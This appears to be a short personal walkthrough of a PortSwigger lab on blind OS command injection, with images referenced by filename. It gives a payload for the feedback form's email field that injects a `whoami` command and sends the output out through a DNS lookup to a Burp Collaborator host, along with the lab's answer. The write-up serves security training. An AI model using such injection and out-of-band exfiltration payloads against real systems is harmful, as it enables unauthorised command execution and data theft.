# Blind OS command injection with out-of-band data exfiltration

## This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the `whoami` command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab

___

**HINT:** 
```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

step 1

burp collaborator => `cvb6cin04zkpvrt26wysc9zmkdq4ev2k.oastify.com`
final payload
```
email=||nslookup+`whoami`.cvb6cin04zkpvrt26wysc9zmkdq4ev2k.oastify.com||
```

step 2

click submit feedback form
fill  details and intercept the request then  replace email with payload

![[lab5_0.png]]

![[lab5_1.png]]


step 3

To complete the lab, submit the name of the current user.
`peter-RqLsYQ`

![[lab5_2.png]]
